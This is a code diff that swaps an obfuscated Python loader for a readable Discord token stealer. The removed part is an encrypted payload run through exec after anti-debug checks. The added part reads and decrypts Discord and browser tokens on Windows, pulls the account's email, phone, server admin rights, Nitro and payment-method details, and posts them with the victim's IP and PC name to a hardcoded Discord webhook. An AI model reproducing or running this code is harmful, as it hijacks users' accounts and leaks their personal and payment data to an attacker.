@@ -1,50 +1,213 @@
-
-import sys
 import os
+if os.name != "nt":
+    exit()
+import subprocess
+import sys
+import json
+import urllib.request
+import re
 import base64
-import hashlib
-import marshal
-import zlib
-import traceback
+import datetime
+
+def install_import(modules):
+    for module, pip_name in modules:
+        try:
+            __import__(module)
+        except ImportError:
+            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            os.execl(sys.executable, sys.executable, *sys.argv)
+
+install_import([("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")])
+
+import win32crypt
 from Crypto.Cipher import AES
-from Crypto.Util.Padding import unpad
 
-def _anti_debug():
-    if sys.gettrace() or (os.name == 'nt' and __import__('ctypes').windll.kernel32.IsDebuggerPresent()):
-        sys.exit(1)
-_anti_debug()
+LOCAL = os.getenv("LOCALAPPDATA")
+ROAMING = os.getenv("APPDATA")
+PATHS = {
+    'Discord': ROAMING + '\\discord',
+    'Discord Canary': ROAMING + '\\discordcanary',
+    'Lightcord': ROAMING + '\\Lightcord',
+    'Discord PTB': ROAMING + '\\discordptb',
+    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
+    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
+    'Amigo': LOCAL + '\\Amigo\\User Data',
+    'Torch': LOCAL + '\\Torch\\User Data',
+    'Kometa': LOCAL + '\\Kometa\\User Data',
+    'Orbitum': LOCAL + '\\Orbitum\\User Data',
+    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
+    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
+    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
+    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
+    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
+    'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
+    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
+    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul',
+    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
+    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
+    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+    'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
+}
 
-_KEY = b'\x87\x93*\t\xa3)q\xd4g\xf0\xd3&;\xa8<\xb6\xeeDW=\x05\xb4\xfet\xe5g%\x90\xe8\xa4;\x94'
-_IV = b'\xa6.\xbf\x94<\x14\x07_\xbd`\x0e`X\xf9J\xba'
+def getheaders(token=None):
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
+    }
 
-def _decrypt_str(data):
+    if token:
+        headers.update({"Authorization": token})
+
+    return headers
+
+def gettokens(path):
+    path += "\\Local Storage\\leveldb\\"
+    tokens = []
+
+    if not os.path.exists(path):
+        return tokens
+
+    for file in os.listdir(path):
+        if not file.endswith(".ldb") and file.endswith(".log"):
+            continue
+
+        try:
+            with open(f"{path}{file}", "r", errors="ignore") as f:
+                for line in (x.strip() for x in f.readlines()):
+                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
+                        tokens.append(values)
+        except PermissionError:
+            continue
+
+    return tokens
+    
+def getkey(path):
+    with open(path + f"\\Local State", "r") as file:
+        key = json.loads(file.read())['os_crypt']['encrypted_key']
+        file.close()
+
+    return key
+
+def getip():
     try:
-        cipher = AES.new(_KEY, AES.MODE_CBC, _IV)
-        return unpad(cipher.decrypt(data), 16).decode()
+        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
+            return json.loads(response.read().decode()).get("ip")
     except:
-        return ""
+        return "None"
 
-def _main():
-    try:
-        _encrypted = '8qSLAs^(-LrIW;<2EN@u7AWx&NX)`})Ql{>zrLJ+mu2)3F8o32ox<*>&7T2@g{q;TQa|po-&V0k*9jQo&7CC~>3{nf8gm73XmI*pH_^e<=z<2|`)=Nl5+_$}T)0MSBTKo@xA-~xzm(H2vha1@&+L7#`=J=AdB#?v6C0gW;6Cu$R*C|}gJDwb#_Y%vV;FZ(hGkL<j7*A>S^~|TLOggl;R_*s0jcQp;DFFwWYq!Z0H0$rPdV`PX)Cm=r+x3TF^`<sAm<VEoZK9)I0#@bZd~8wUO~VHf*lN6CQpQ==PTc*I!N=0doiPUk}8<|#W4z@PiY6JCw7u>_`B7sXp7dZhEd}GcCKla)cPHc-eS6BqPu)<?0U|!ZktPYEQ-!H3IO$9?@&0JMe_W~kIhGT@#1c%bklx}g0;LRZ;5p;oc>J+pg3+T{!oco#y-{5q&9aG?uwvZP6m6-$72WFK|x*dk_W`0(F-QL(6r34gpyZGGriDwkae@H<qyC}GF&t=ja<L#alFPa=r(-(<OVD#D9R!cgyYY3KsOovVWiTK6`a$_%ZWg<JkPGmN{w@%mXY@OO+6D9z(N~x`T8w1G<(HrNElMOIq=;+xIvF$u+!a!!4V-p=FLF(52EZ<8qRGbL`QYAa?%VIPFbag3-Q=BYlS|!%B!t{ecquye_e%5Z2H(djpIHkW-i9UwyKuVK}^(|ahSta4~y+XRI!oSL}^XKF*d(~svTVPutrIB(fg9$IyErN4lL(u05*_yLn!9We7MgY`E|={$Ohb1b%yc(6;#Oguh3ZPTrIOE4BSHxOAY3w>ur=5bGfcw1W?iH1_}QFd1O_N@Q3ZHvj7Dc<eVlb>P($?enG78!-4-kU}0F%WDAZ}S<$tNEzeTjKA^k-d~0l{D^O952as}g4SK{IZQnQT4E^R5<`3k-pi|V+J?*c&@`K_CXO7pDQL0DqmYH1{oAj0NRpqC>&Pib?V%6daLd?Z~GRkv)HX_-anfm8<E7(A+m|OJ$cSqevH&rii3gq-Pj*~JzrP~^HdbaH%@V3n{#R;#2N&?~?>*e;!=?5FVH)7P$?`a<&tenpQ-Ec}F$-y^#5j+|6+_d84)h-NZx=HDm3ut-6L|}>NgIkpW!$BVf_nUVin%w14_uOmjoyUE~7n=0Ob$G24T!i)507mntm$cMw&C@XrSuK)8u_V4G3~1^cZvo(6$)n7JmHZ)}v%H{VkHO>+txH}I<N)#71i!&asOqbRJ>)4lO?l^UcxAhmr>gh?8d;ub=2PQ7o&AFj+3dG5^Xs28me#AP*P3{{YJ!FUO~2aF7{@A)xIFuKbt;NQ&1OD3o7)-}5wm#xqs73dn2|B#0lxmxica3tKh|QGV=`LE;swkQ<qYY1K&Z9ISK<g=G`c3tnyH`qMo6rHHxNF&S>3m1?(}W#v}Iq6if|C!@3WMa6Z#lO{e(O3aRcb4xY^$@lw&Kh2;dy;V-f0v+h}SrcKSLfjlkZ^k_t?J{L2sJrFskJ%~Oru`Ol9auR5Tx=Kv2tdUbg_F`?HqbjsX~%(-HwQPhVM$!mciTbz(9l++xqF-mO;a*-64#ZbW0GT|Q)PeV-$5RDMd+b{Toi(nu@Mm^1C`cX9G*Wr5-QU&5-1Pq;lnc%H4`BR5qJYEufp9i9DHB~SW)wsZw4nnPUR)a!R#uu})dT_{^lGT{g2-@fYQsSQRer~toexyi3#qc|*e>-|@tK)Cx!}ftwyeslS3HN@zrUgDHT1S8o;EB~;Zbb{lN*XL%EM^!Bo5kL=L3_vYNT^0=_`F|37pKJ5CrKQme+^ArOHm-m<DmH7_&=RuU;?=dIfemOD>;t#yxiOeN#j?l$NAw!LqRwpfy5~zLa1H@Hu&^&H6C^~L<&h;1i~H1mQnG4jMa@U|933l{IHbH6vvsVsCS^{floZULfY}AH9dAo<Qm8nU#St!UHKq_M=sH+w!&gAfgEFqA2@?%?jiScb!z}WlDQ~Xy+6MdBF@pFx`O-H|1$D;^dnsy2}S>N6_4EC=BE<Q?yB`JjM+@67U4Cj1`;x;eqLt%4Uy_&X%%3HDwq!~yIr+wvuWs&9ca4TUGbk)-wivmSoae?+op~trChh0`NbBJ=eW5E7*e&_`DnyGA~@4CwJa0M$%M?EilVLhV^PD(8?3MMk|nFx*Ni>+2-@K!=w-;W53S@}#0EINL8!viS4W_pH;<GVzDAV3J+Gl|qaXyh|KTFL;Z#wm`N@I^x11!c<Uwk)b4k(ZNhYBeFGNurU583Etz^hnT;oJ+vxD=6K!fGOZ>U460T*=_`pS8<GP;N-hLw9;z4F$)g;CFb8}&owuD5r}tZ%RQnDFgVy6e63Tx`*?IO-Af!445Dy1!T5f)c3e72tvduLB$y?-=r%(UND&M3O@9^O-rDQ3F0IHxok1o9@5c!`Y<2#%mCf%ttJ-Le6!C9;R>s%?{zHO_M}Vim!IA8ZbpHEssXkBE9oi&KM+esUtdwbW+KhS2D=!(DRLvjitWUl4my$tR~;x{pD{e+-2ho$})O7vwI=`BtL>vrXycd_CIHx8PUBJeIxkGI5>DpPyXvZqY*k{ffJpY-XfyIDO~kuvSj3DcqL1yA>#<l+=wC+AN058S+ug{RFFlbQxf7?2wIGN_EN(e>*Lx6RKz3c8TRZY)jwP)_z%^Fz<jgPj`B#X<&fKs=d5J{n~Y<Hy`5Of3Fa+%Ux2{bVOYqUmAs9Hp31A_61jko38hj!7asW!(0JPDsyUSQpf=a{tFd#LzU@&Jpvz%gkgm{SAGL78`YACR9x|aZyRr#*$FY^DfcT=L(S9!`UWIlFEPsT6fyYCPGDaZ<p{SU6GWMB;_2Ba-WN>cAGH}<~IGfzK5_c=`rgj(9aj7$Wo8yu-!iP?zlpa-Z#|#*)d|opwYj9#;q7VSS6&n5T^rBd_xy}s3A+M6^QbO;@*VyWFWqK5jX{*!l(D16qS(P+iI6rQh+ss*{Qo#w?5(!d+;BdfF@!kuHVp?4Cbs80OyYz%kJ;A)<$g#Opyx$zGDTFrfs~9R08V)_=yvR4)n886y3XlE>4aOh}4}KVo?-MMAWI*sF{H0mMO#a7levk~sewP1|uU>@*dZ}XSkGWq6>MiEdQtlYDhA}f~+=CXulZ`1t)t;R6H!gdY<kr1J%iy?%2CMP@H~ZzS--Zk>)?_wBcJDf6Fx4^Q8WBX(P-1VU%NMf&^h2FhDCG49;T*{3J-$;uFp)t#3J?e*4AyfWm%xucJsyBcM*4tL#@^=&{<oL(R%qD>-)<%vh!JtfUrwR_Ctr7b6^XV>cCNJX8hvcPXG~NUs|O<IUVoXCV@q)OtdviJSto&J2_MW8a2)w2v``PSYNM6rDM4?Z(@i-oRR_$%s>nbaQ2LZRy$UiJoHd7`Ng)|+<Bwpp7ZD%9zFJHs0Sm(_S9k=PRilF1nSuEhao5^%_M*{JFUPWRVw~n-j-t$+BLt6M{g+G}*`mlh_!eHGQlem!q{HEy(o-y_uFBb1c|FPNA}OAyyz3J&p8>(d0*Q!~{m~?Btq)1m@8hrH`xOoLeQCf2J<(Pd6-N9%A{`B+p-<~ySIjKQoxhITO>Yl#tOJg*QEoJ~B<u3N4+$uW@qG02>n)Yfk^=Fbq}1-o`ADn}<6`i4N%*l)3KT_rM99i_1J%>ize*6?^Mt)|VvECUD4sLW#Qgt2rW1s3=gTn(7&4CNjcSp~%<bVuLJliJKIOf+E(s&DO24R2e)GI<qGO0}ep5sU3g3DVk9Y#uB!_w3;cCAEv9lsI-Q>O>)PFDVG$K}>@h?#iY-d8}mIODw)5sZ8OVh45iQFYH3%?2+AjlHD=ZQlcgk1C+<}#HF)0pbGM+U~XT4$voqyf%9yWesdGqs8`KKnDD5A@}<*6SFopg^9sbPeX0=EtX52;{hlI=~2~FXP4ni#J%)I3)AY9viD4G0pj@QsA3)kywCfRfMTDMgY|5Z-v(1XK6izI_?FvlFcEi7f(fU#b2yQ{06cUwcC!zM_osP-*uO1v>`#)KQ)&|Y+;-bne{YrAAE3pV<>UiZj>CR$aRgXE|Tfnwg$sv+u4`9urRpP&r*~-dGa>2`ZSgUgCR>(ubw3<{U#7>i$NrKw~KvsF2KGu%{HoC;73{B6?Wf>(kzM_Y}77kS1hb%c+PNpVDcvn4($ID28GVZF|8TV{DsAuqS32D)(K!?=JJxS<%+|6x-I>07Pkc4ZJnlVR}9ofDypuqK_Y8>LMy1#RAVA`OAYc@@{;#T41?ITA5UdPDqE1wd;)cL!3&c03J`i`o&Y*gX<Wz65<-Aqjf!=<6Ad^QogGg^f2~VMkgSPW-Gr@KWW8kCS(q<llwy=;zyPit7DlT+@;dUte><fMP_s5sYRaPVlZ{j}Tty)HM#mMQe$7$FP6`cXAbCcU73qd|a_M44e0M<3A2oy52U+eYKdJHD3SVYQf8lO>1-krI^dDu=VF0L#ubnf}8aU7<O!lwt7;=Psq)9<O>$f4`iGbI`zB&wO;~cR$R|2a)b_v}{tupA2by$BnUIefCPbX9B(?RtT^3L8iLTmw58hwXwaOM=|G5Tz?4%My6T9{|IqxYMycF7M)+f#UI+Zp?%&|VC57fs!DPkg{@(LQ}4Tn7iu5J}2v_DC#Bue&mG9Taft-4mgHkFX-TOfiz%E@3aRFZv_>^8e_!aNP;*X1pto#85LB4FM~tFF!<l;F{=R$I%$?`-iT;pVvhFGlZcUF{fiQN=)V^0Qc^Lq?*L{F_G-gm(#>@4{_A9^MKRrEJ8pvrk5gtZrQq}Ol=Rvv~ZPy*eMMbE-4@&%fdekADSndN(?f*X&5#o_-S_^pq@OxI{mw^tkNUmEH`3$I4@QSsj@5K=tbWH&j-g$Mb`kNyEh7-%+o8DwkmRAgMheVxS1IoT)27u>F#<;dm;@p<1HZ|7i4l=T;4@7lJ5or9@EX&z9EO8c@b;dm_oEc2T3p0z&3meI8Sz-#od_cr{Mi&T;O_|(lMd};B`*Pe*je1Y<_KWp?1tk?IeWTf$I#|lgf|wH{`1GO0H4C-=-@mo~kZByA9RaY2NyIEz7BlFf~P^-9~`Gi~52&-5(QK<W%jivj*l_mWjw;`-j@Q4`^@c^n65l1ECyVXay@p7AFk%mA(zR2#||>O`=MYCRjm2N8eeSihOmY&W{X@=|lmQy;!jB1+O%%p!PDfJzL41$cl0jISmeu5S~!%nJ{b7z@V2zDF$j_kyA2omnzjdDMk2=8jZO^OcqonT{`NW`|_yqT?_pqCr&WxDGUZm-shWwd!Xunm{%)tDsinocTQLMj2DzWH-+79)x6YlF?^<5l=XeRdf!fowounsj_Lw-e@n-}MP2z<9vt|~GF*BU%Qf-VqLLnc2mw0<y}ft<54=PeH#m+UuM%9Q4sxhp?<JPO{&Bt@%E<i_>Z)~}J{;CR<^|3(M|BzfwC*wo`M$&s_H5biU3{3Zy9wV3;r3yVQws<rk**^|&#E9)pZVjJx9ud_=VboL$aoTvj@YoSWvr+MN3eOibK{rOd(~0Q40JICn%qAeP!8P)O(m4<=>>eNBjS?|>krU+coxu_K$zh?Kj8!*&vfpZ*$h}$`5~E=4K|H4VyDv(M{FWPur$~lozPluEi}Nw>gZxr|LslPiBGjkdAGNvlArTZVu*5%dg<ykvvc;lZcz;{FnJq2g;(h>&`^;@9l!9>K8m*jrw)uB4nw6Ybq)D=ptYG&nGJC|7M}4hZ4YSd1egP7GbJit7s_}=AgIkYu(uFN)%nZ{#ouk<#T<2q8ti6>ZDZdM2Qj2%c*O^_m*^}s>ohmU2a;o~kbBaAX+%>VOg6^*5G3M0ef`P$YxZHEWPg*TXYhzq91j55KUaJaHZGhKXCIzH2jA?rFh&@Ulw_aqDTbtWT`vtwoC>qt>=W4@4VkV7niyCz#J~?Ue$aL<o-Q05{r%Yg+N)WP;`FY3Mq@bYfxB$MADh<{Q!)Iv)Q6LfdnR-XQn$<Ay!R5(=FAGBJ;>QcmPe7#@@=vFLr+!>q{&!035F|Xw|3j<wVE`+7s1ig3C|<n+tHLv=yPGwzJ&AG;8qZ2k7^#7^tUPH_p%%8YuQ}Db!Svq!ly{t;R27K#}p<_T_mz-3ybdk;ye)?I>FNK<zk}Bk=MP!e}3e;#$5FiETZ-7{#PMn#ZN1>Z1_sjt22U|vL)<{B5uiaV>B@RAJ(urZM25-%iRNP**2ozsZY2`M{v1gvxtGCV?yJqQWCZFcd<(aPd*~kaQ@h>0$kCm$UWljrg)3#y*{9{Pa7+i+u`b=V2hOCtQ=c&>jq4l6WsR@wxp)ZQXTV;_z$#nc>6-Kn!6@$a`?bA$xo81uxv#!$!9oH*z}!T8YSYh<nah!XFWuhOdw|l?l2{Nf*BA!r^#1?(l$G%kg6{NwEEtv8p#1_ahuQv)t<z+IWLL<@U*cw)j$#P5OV~>e(nCee_ZN!Uj!t}L1?v?n-7@X&P+~raH&>C^R6J;@uw=ZC7)%LLMa&Kl7si+Gym-4%`Mm(IQq$Tm8FnQuZ~_hn{3-B(IXL*6mw5!@a_t`jcD;2SaPc{9ukR2PpOn_dns(b3MfMcPF3yQAeTHvC#KB3zl1kbc;)OgHlY<?_!W52T;zZ+0H5;ly3M7=kr=-XO+VE9Ki``QQoH8~2jCsCVk-N;9*@-a0e7`0Q;;ksd9c&u#!-$@LkAVI@vGnrY9|Dmcs42@%bFCnsS9I>7D$hg7Skt^vv^B?|9xyBAS&`4A(;}Jsg_i2Y42Ke?T0tb@`CpL;x|U0E>c=pxV+qoN`2(#COU;}0dt>K@I_Rm>t_I#cRR$j!3OA-L2=qsm|0h_O);%q<#`~t?_s<3BNpeB@+SvrO{)Wk?dC^{Qn@ILhJrl47`M^85>2YMfHsq68qUmQ6gg`kVBxzkV=UFgA_@Pgt5$$6XPQFMm5uFou=pGMuZg=H)iu7nNg8|gPUxu>tl^Bgg^P?jPSnUhq%jQzxzAq7+W%oF4T#GJx;o^kn=i8tc*S*cW6`IlkK@^DXqzmo85vP;pJ#EY{X6uKL40BiaY;i!k<~Op!y9qB{smJYH!OiGHPp$iB{Na?1o7EiOXVFZlXigt8P)>JF!thE^-K>X4V8=!E5Ahxo#p;=GW|;5co!lZBXF(<Mrw`G?-w9?>4F^r=gNLBu?7Rpr(R2xSDVHcrN_qD;lPE6T$JvnztY$^X=@B354m0{gh3)|O}k&=H>6jo?N-2Yq_ZK5sqO2Iw64wY<L}}`W)S^^PbBdst>YSoKx^?SjPTyP-2%7rKCR7%Pc2W2SboriFkzcae!-2vMhO8o&NX}yUC8M}0lTF2I-p8AlYvJ4({F{av%Ct%d7r$2?n(@I6FuwA;Li&;I!sz<?-4@7jxTOXq3E6=yHel(*Z^ugRbbMtn(LU~){_cpJF*_Rk1cMF`pfE%+rK$aiW+|0bXXfTSC+r#t4e=DH%mZFvve&7FmI$ho>{4*Df;3CDH~i-8(WAFtDL-j`z^^nbQc%Og0PMHU?}H4;L{HULc<PF?D1bv!4jV|wYz`g9R^syHtz<kk$S9gXKPrD2TaHX^|&4y18~4gmmfZ6Xq87`+B5coR?hRqFsIhL;{>2%*9hV|q&OLt`pjMzSa+h8LbnL8xeY$7av}d)_M4TM8!-F!M0A}NwY{0(Z{DAPtiHW-HRI==M!;_E*3ou5K{Lo&WGVOoRtwVCwQ+P<M6_Cki-1PBHisF6BLM_3X-G>Kiokts({r|x-jGt2m=UyF1Hv-&Kr8@eG!i%5?NPo5iXmkY8__B$_eG$%`5ATGUY{{6mN^8LJrweidrSAJ33@Z4iKp%}TGQYIxs^pfWgXC(_tHd(`0yaWsLcB>b1duREVCsRv!dHHG<Gx@=(t@H#?aLahEFCqOcnbul`d7VeX*f@vr=#RBh6uve!XFi>GB`e;|*qLT6u<noHt7L7XuE75O+SqTeqJ?ai5!O_!D3p^oN-{WCLUMe`c~kVsUnURcCi7Fz_wxJNrSG4M1Q?ISX^kHv@Z~2O0Up)1TfePNpR&op(FoY79QQw%FC=e>_dl{Q&I|v_K?{OSRxsIR{x=5xgiv5|P>*KPn?1AV~K}S@*J%huu!xk&(_;LU8h&K00&+x(B&<mEF~`=%$X-QgE`cK_N;%Nv}RR8E;wmJqRko5bwTPo0IQ_D6y*@NuS^1hSpu%GZn#n3xcz+3sO`h<(myFzk`rby$Gii-0MHOa9_J;FO(mVPI*EYF~Z$al^UasGh?Opp*D9KW0ACdy8JZV3U*&B9Bwu86VyY5!R^kC=FUcz$$@ZKnv|(iCKK9BM%vK004$6Dcegz$B%&P3!Y30YUd=QOP;qJ<8bm#|)0p&RJN91LBtb)f*=I_s78s>c2ft&vXbNtt=#regh;gBjN8Ol}P@wsicH&JvO;rzq{<(#MU}>v9xr-2}v<3+w*FWSm1Rm+=Oh)nAU`TI!wUs;nGc9BqB+~ex__W_v&C~T+K+?y7?NTaNaNyLM0bY^~sK2<%IpWz$*R$Poh!N7ddFpDEQ3S^JEi|#unGE%#bxT0Piq!x<)-5vTxOqZD0TR83;vKfv94Ja}uJ-Eq8G&Dht~!ihVaB_DvbXg?ViwSamWDA0Y5i?x<H*lcdXfuj|Ib-B25x|bcpgr<#>F~1e*OlCe`UkjfX#-VK+yj!s&aNO5Rr6(<?rQ-E&TNn3<dn9|HFL4c6Y8(r>d+ZAKe2~1WxWPkp32?e3T^I;kV>|{q|PUHg_N`k}N@$1E;w2yO2)5Vez^zNcmAHb1`nX6nl`mfqAXw;Gx)8=$8FcQbtz&UqTg#D(QhMkmGV;T;YW&{H^#~cxccv`6N0DnVX$vp2R+f5!P`KN<Ms!FqMp{uWUm$Pvih4$1v7KRCzte40}!|<49E+Oyb1TTvMBZRTTz*bxp|Re}q23$Ql$mvNtoW))IHWNz$=6`A_1N$?JPG+g2}H`WQraw{#`Klpxtpn}Ax&>eA72y#YKAONv5<T(%p{--ei{H;ilXFZE*Dc*9X;;x|7SRmM;8n^{uDQDl2RM>VRc8YC7?VQTRSLY8ZUH|sbg;sr_d=(-HAf{DH(GhD@8tq>zq{(|B<q7V87Nzs*HWcS_D|Alk0Q@czyW|G<}EzT4&%ShQT0mwPg&D|CZ(aUVlU$Keb8@mV=aK+ytagwFQ!V=MyjHP$B%%6e~9r+e2ylq+>e|+f2;PGR^&ze3bm$^0JqtWSCblRnaxC|I`Db*5FGOasXegyRL{tpYvVe@LAvV{bu+warmQf*4~23YbIHoN_Q#75nH*C$Pc(RmNhgE#`~?n5^{(OpVJvHO&Y`pij63>9Yhcij8YS`)Vvm)_8XJ)z1nNE<iEn+Ovv@<-*hV;r*WH6T?YzgCA7Le%{kGAjrHT!6Ibo5aMkXhlg&49Y}U!{5KpfkjvEkv86U8T7Gh-z@g?$9*Fs^h-TF&rUPj*-)OF91M^*wvnFRt&xJ6>+ojg_AXVAfx-WFFg?=B^a2A*5U0n^94qv3{5I1|@Pca~t79C-MsY6PFaPYMbA)Hja3Bm+$)laeKO{wPTaS%4hlID_VP~3C%hKc?Db3_Ecu9o1aOIbh3~X<!HbQ}av9Dxj#;#h!Ouam+x@<FY;lZk<N!h5){LSTt-6HV5ofKRXN+ZzxaVrH%1}1C&4=$FbUs7zW^Y12$a+FbrzyZhVTACSXlR@CFtegQ-{_wEE8F=u1kEV@S3^LCkg}_*GX@XWF1RrH3MO(8o|8Q8`shcZpuap~ks2+Rk{ts@Tu9F-K$!s5@^5T<6#-0$hygK)H_^{`+^`9^3'
-        
-        # Decryption steps
-        cipher = AES.new(_KEY, AES.MODE_CBC, _IV)
-        encrypted_data = base64.b85decode(_encrypted)
-        decrypted_data = unpad(cipher.decrypt(encrypted_data), 16)
-        decompressed_data = zlib.decompress(decrypted_data)
-        
-        exec(marshal.loads(decompressed_data), {
-            **globals(),
-            '__name__': '__main__',
-            '__builtins__': __builtins__,
-            '_decrypt_str': _decrypt_str
-        })
-    except Exception as e:
-        print("Execution failed:")
-        traceback.print_exc()
-        sys.exit(1)
+def main():
+    checked = []
 
-if __name__ == '__main__':
-    _main()
-        
+    for platform, path in PATHS.items():
+        if not os.path.exists(path):
+            continue
+
+        for token in gettokens(path):
+            token = token.replace("\\", "") if token.endswith("\\") else token
+
+            try:
+                token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
+                if token in checked:
+                    continue
+                checked.append(token)
+
+                res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(token)))
+                if res.getcode() != 200:
+                    continue
+                res_json = json.loads(res.read().decode())
+
+                badges = ""
+                flags = res_json['flags']
+                if flags == 64 or flags == 96:
+                    badges += ":BadgeBravery: "
+                if flags == 128 or flags == 160:
+                    badges += ":BadgeBrilliance: "
+                if flags == 256 or flags == 288:
+                    badges += ":BadgeBalance: "
+
+                params = urllib.parse.urlencode({"with_counts": True})
+                res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/users/@me/guilds?{params}', headers=getheaders(token))).read().decode())
+                guilds = len(res)
+                guild_infos = ""
+
+                for guild in res:
+                    if guild['permissions'] & 8 or guild['permissions'] & 32:
+                        res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/guilds/{guild["id"]}', headers=getheaders(token))).read().decode())
+                        vanity = ""
+
+                        if res["vanity_url_code"] != None:
+                            vanity = f"""; .gg/{res["vanity_url_code"]}"""
+
+                        guild_infos += f"""\nㅤ- [{guild['name']}]: {guild['approximate_member_count']}{vanity}"""
+                if guild_infos == "":
+                    guild_infos = "No guilds"
+
+                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token))).read().decode())
+                has_nitro = False
+                has_nitro = bool(len(res) > 0)
+                exp_date = None
+                if has_nitro:
+                    badges += f":BadgeSubscriber: "
+                    exp_date = datetime.datetime.strptime(res[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%d/%m/%Y at %H:%M:%S')
+
+                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=getheaders(token))).read().decode())
+                available = 0
+                print_boost = ""
+                boost = False
+                for id in res:
+                    cooldown = datetime.datetime.strptime(id["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f%z")
+                    if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
+                        print_boost += f"ㅤ- Available now\n"
+                        available += 1
+                    else:
+                        print_boost += f"ㅤ- Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}\n"
+                    boost = True
+                if boost:
+                    badges += f":BadgeBoost: "
+
+                payment_methods = 0
+                type = ""
+                valid = 0
+                for x in json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=getheaders(token))).read().decode()):
+                    if x['type'] == 1:
+                        type += "CreditCard "
+                        if not x['invalid']:
+                            valid += 1
+                        payment_methods += 1
+                    elif x['type'] == 2:
+                        type += "PayPal "
+                        if not x['invalid']:
+                            valid += 1
+                        payment_methods += 1
+
+                print_nitro = f"\nNitro Informations:\n```yaml\nHas Nitro: {has_nitro}\nExpiration Date: {exp_date}\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
+                nnbutb = f"\nNitro Informations:\n```yaml\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
+                print_pm = f"\nPayment Methods:\n```yaml\nAmount: {payment_methods}\nValid Methods: {valid} method(s)\nType: {type}\n```"
+                embed_user = {
+                    'embeds': [
+                        {
+                            'title': f"**New user data: {res_json['username']}**",
+                            'description': f"""
+                                ```yaml\nUser ID: {res_json['id']}\nEmail: {res_json['email']}\nPhone Number: {res_json['phone']}\n\nGuilds: {guilds}\nAdmin Permissions: {guild_infos}\n``` ```yaml\nMFA Enabled: {res_json['mfa_enabled']}\nFlags: {flags}\nLocale: {res_json['locale']}\nVerified: {res_json['verified']}\n```{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}```yaml\nIP: {getip()}\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {platform}\n```Token: \n```yaml\n{token}```""",
+                            'color': 3092790,
+                            'footer': {
+                                'text': "Made by Astraa ・ https://github.com/astraadev"
+                            },
+                            'thumbnail': {
+                                'url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json['avatar']}.png"
+                            }
+                        }
+                    ],
+                    "username": "Grabber",
+                    "avatar_url": "https://avatars.githubusercontent.com/u/43183806?v=4"
+                }
+
+                urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1406103512965845034/ORJ91Hx1VmVx3DNXb4h1gHsDMIEnhozMTyPlk40CiNshgMhgmwJtExM9eL-MFRqXNPDn', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
+            except urllib.error.HTTPError or json.JSONDecodeError:
+                continue
+            except Exception as e:
+                print(f"ERROR: {e}")
+                continue
+
+if __name__ == "__main__":
+    main()
